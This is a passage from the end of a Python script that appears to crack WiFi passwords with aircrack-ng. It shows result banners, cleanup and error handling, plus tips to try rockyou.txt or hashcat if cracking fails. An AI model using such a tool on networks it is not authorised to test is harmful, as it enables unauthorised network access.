        print("[SUCCESS] WiFi password cracked!")
        print(f"{'='*60}")
    else:
        print(f"\n{'='*60}")
        print("[FAILURE] Could not crack password")
        print(f"{'='*60}")
        print("[*] Suggestions:")
        print("    1. Use a larger wordlist (like rockyou.txt)")
        print("    2. Try with hashcat instead of aircrack-ng")
        print("    3. The password may not be in the wordlist")
    
    # Cleanup
    cleanup()
    
    print(f"\n{'='*60}")
    print("[*] SESSION COMPLETED")
    print(f"{'='*60}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[*] Interrupted by user")
        cleanup()
        sys.exit(0)
    except Exception as e:
        print(f"\n[-] Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        cleanup()
        sys.exit(1)
